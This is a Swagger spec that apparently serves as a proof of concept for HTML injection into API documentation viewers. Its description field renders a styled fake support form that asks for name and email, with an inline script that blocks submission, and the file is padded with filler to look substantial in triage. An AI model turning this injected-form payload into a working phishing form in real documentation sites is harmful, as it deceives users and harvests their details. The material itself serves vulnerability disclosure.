swagger: "2.0"
info:
  version: "1.0.0"
  title: "POC, Large Safe HTML Injection Demo"
  description: >
    <!--
      SAFE POC, HTML injection proof.
      This injected markup demonstrates that remote OpenAPI specs can
      cause arbitrary HTML to appear inside documentation viewers.
      This PoC is NON-EXFILTRATING: it prevents submission and does not
      perform any network requests. Use for triage and reproduction only.
    -->
    <style>
      /* Clean, polished card styling */
      .poc-card{font-family: "Helvetica Neue", Arial, sans-serif;max-width:760px;margin:8px 0 18px;padding:18px;border-radius:10px;
                box-shadow:0 6px 18px rgba(0,0,0,0.08);background:#ffffff;border:1px solid #e6e6ea;}
      .poc-heading{display:flex;align-items:center;gap:12px;margin-bottom:6px;}
      .poc-badge{background:#002f6c;color:#fff;padding:6px 10px;border-radius:6px;font-weight:700;font-size:13px;}
      .poc-title{font-size:20px;margin:0;color:#0b2545;}
      .poc-sub{margin:6px 0 12px;color:#3b4b66;font-size:13px;line-height:1.3;}
      .poc-form{display:block;margin-top:8px;}
      .poc-row{display:flex;gap:10px;align-items:flex-start;margin-bottom:10px;}
      .poc-col{flex:1;min-width:120px;}
      .poc-input, .poc-textarea{width:100%;padding:10px;border-radius:6px;border:1px solid #d6d9df;font-size:13px;}
      .poc-textarea{min-height:84px;resize:vertical;}
      .poc-cta{display:flex;justify-content:space-between;align-items:center;margin-top:10px;}
      .poc-button{background:#0073e6;color:#fff;padding:8px 12px;border-radius:6px;border:0;cursor:pointer;font-weight:600}
      .poc-note{font-size:12px;color:#6a6f77;margin-top:10px}
      .poc-status{display:none;margin-top:12px;padding:10px;border-radius:6px;background:#eef9ee;color:#0b7b3a;border:1px solid #cfe8cf}
      .poc-small{font-size:11px;color:#888;margin-top:8px}
      .poc-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:8px;margin-top:12px}
      .poc-sample{background:#fafafa;border:1px solid #f0f0f0;padding:8px;border-radius:6px;font-size:12px;color:#444}
    </style>

    <div class="poc-card" id="poc-card">
      <div class="poc-heading">
        <div class="poc-badge">SAFE-POC</div>
        <h1 class="poc-title">Injected Support & Demo Widget, Non-Exfiltrating</h1>
      </div>
      <div class="poc-sub">
        This rendered content demonstrates HTML injection inside documentation viewers. It is a visual proof only:
        the form is intentionally prevented from making any network requests. The demo shows how attacker-supplied
        markup can appear inside the docs UI and read local page context, but it does not send or store any data.
      </div>

      <form class="poc-form" onsubmit="event.preventDefault(); (function(){ var s=document.getElementById('poc-status'); s.innerText='LOCAL DEMO: Interaction recorded, no data sent.'; s.style.display='block'; })(); return false;">
        <div class="poc-row">
          <div class="poc-col">
            <label style="font-size:13px;color:#233">Name</label>
            <input class="poc-input" placeholder="Your name (demo)" />
          </div>
          <div class="poc-col">
            <label style="font-size:13px;color:#233">Email</label>
            <input class="poc-input" placeholder="poc@example.com" />
          </div>
        </div>

        <div class="poc-row">
          <div class="poc-col" style="flex:2">
            <label style="font-size:13px;color:#233">Issue summary</label>
            <input class="poc-input" placeholder="Short description (demo)" />
          </div>
          <div class="poc-col" style="flex:1">
            <label style="font-size:13px;color:#233">Priority</label>
            <select class="poc-input">
              <option>Low (informational)</option>
              <option>Medium</option>
              <option>High</option>
            </select>
          </div>
        </div>

        <div>
          <label style="font-size:13px;color:#233">Details</label>
          <textarea class="poc-textarea" placeholder="Detailed description (demo)"></textarea>
        </div>

        <div class="poc-cta">
          <div style="display:flex;gap:8px;align-items:center">
            <button class="poc-button" type="submit">Record interaction (safe)</button>
            <div style="font-size:12px;color:#666">Contact (placeholder): <strong>poc@example.com</strong></div>
          </div>
          <div style="text-align:right">
            <div class="poc-small">Do not contact us to request data or perform tests, this PoC is non-exfiltrating and for triage only.</div>
          </div>
        </div>

        <div id="poc-status" class="poc-status">LOCAL DEMO: Interaction recorded, no data sent.</div>
        <div class="poc-note">No external requests. Use this PoC to demonstrate that injected markup is rendered into the docs UI and can access page context locally.</div>

        <div class="poc-grid" aria-hidden="true">
          <div class="poc-sample"><strong>Sample:</strong><br/>API: /v1/users<br/>Method: GET</div>
          <div class="poc-sample"><strong>Sample:</strong><br/>API: /v1/tokens<br/>Method: POST</div>
          <div class="poc-sample"><strong>Sample:</strong><br/>Docs: Rendered from remote spec</div>
          <div class="poc-sample"><strong>Note:</strong><br/>No network traffic is performed by this demo</div>
        </div>
      </form>

      <div style="margin-top:14px;font-size:12px;color:#666">
        Reproduction guidance (safe): point the docs viewer to this spec using the viewer query parameter (e.g.
        <code>?url=https://example.com/poc.yaml</code>). The widget will be rendered from the spec content and any
        interaction will remain local to the browser.
      </div>
    </div>

paths:
  /status:
    get:
      summary: "Demo status"
      description: "Return a static status explaining this file is a safe PoC used for demonstration."
      produces:
        - application/json
      responses:
        '200':
          description: "OK - safe POC"
          schema:
            type: object
            properties:
              status:
                type: string
                example: "POC safe - no network"
  /info:
    get:
      summary: "POC info"
      description: "Metadata for triage teams. This endpoint is illustrative only."
      produces:
        - application/json
      responses:
        '200':
          description: "Information"
          schema:
            type: object
            properties:
              title:
                type: string
                example: "POC, Large Safe HTML Injection Demo"
              contact:
                type: string
                example: "poc@example.com (placeholder)"
  /samples/one:
    get:
      summary: "Sample response 1"
      produces:
        - application/json
      responses:
        '200':
          description: "Sample A"
          schema:
            type: object
            properties:
              msg:
                type: string
                example: "sample-a"
  /samples/two:
    get:
      summary: "Sample response 2"
      produces:
        - application/json
      responses:
        '200':
          description: "Sample B"
          schema:
            type: object
            properties:
              msg:
                type: string
                example: "sample-b"
  /samples/three:
    get:
      summary: "Sample response 3"
      produces:
        - application/json
      responses:
        '200':
          description: "Sample C"
          schema:
            type: object
            properties:
              msg:
                type: string
                example: "sample-c"

# The following repeated blocks intentionally expand the spec into a larger file
# to make the PoC appear substantial in triage. They are harmless and illustrative.
# (Repeat a set of similar paths to increase file size, these are non-functional placeholders.)

x-extra:
  note: "Repeated placeholder resource block to increase YAML length for triage. No external effect."
  repeated_paths:
    - name: "rep-01"
      path: "/rep/01"
      method: "get"
      response: "ok"
    - name: "rep-02"
      path: "/rep/02"
      method: "get"
      response: "ok"
    - name: "rep-03"
      path: "/rep/03"
      method: "post"
      response: "ok"
    - name: "rep-04"
      path: "/rep/04"
      method: "put"
      response: "ok"
    - name: "rep-05"
      path: "/rep/05"
      method: "delete"
      response: "ok"
    - name: "rep-06"
      path: "/rep/06"
      method: "get"
      response: "ok"
    - name: "rep-07"
      path: "/rep/07"
      method: "get"
      response: "ok"
    - name: "rep-08"
      path: "/rep/08"
      method: "post"
      response: "ok"
    - name: "rep-09"
      path: "/rep/09"
      method: "get"
      response: "ok"
    - name: "rep-10"
      path: "/rep/10"
      method: "get"
      response: "ok"
    - name: "rep-11"
      path: "/rep/11"
      method: "get"
      response: "ok"
    - name: "rep-12"
      path: "/rep/12"
      method: "get"
      response: "ok"
    - name: "rep-13"
      path: "/rep/13"
      method: "post"
      response: "ok"
    - name: "rep-14"
      path: "/rep/14"
      method: "post"
      response: "ok"
    - name: "rep-15"
      path: "/rep/15"
      method: "get"
      response: "ok"

# Additional verbose but harmless info section to inflate file size
definitions:
  DemoRecord:
    type: object
    properties:
      id:
        type: string
        example: "demo-id-001"
      status:
        type: string
        example: "safe"
      created:
        type: string
        example: "2025-10-08T00:00:00Z"
  DemoMeta:
    type: object
    properties:
      owner:
        type: string
        example: "poc@example.com"
      note:
        type: string
        example: "This is a non-exfiltrating demonstration."
  LotsOfPlaceholders:
    type: object
    properties:
      p1: { type: string, example: "placeholder" }
      p2: { type: string, example: "placeholder" }
      p3: { type: string, example: "placeholder" }
      p4: { type: string, example: "placeholder" }
      p5: { type: string, example: "placeholder" }
      p6: { type: string, example: "placeholder" }
      p7: { type: string, example: "placeholder" }
      p8: { type: string, example: "placeholder" }
      p9: { type: string, example: "placeholder" }
      p10: { type: string, example: "placeholder" }
      p11: { type: string, example: "placeholder" }
      p12: { type: string, example: "placeholder" }
      p13: { type: string, example: "placeholder" }
      p14: { type: string, example: "placeholder" }
      p15: { type: string, example: "placeholder" }
      p16: { type: string, example: "placeholder" }

externalDocs:
  description: "This spec is a purpose-built safe PoC for triage. Do not perform destructive testing against production."
  url: "about:blank"
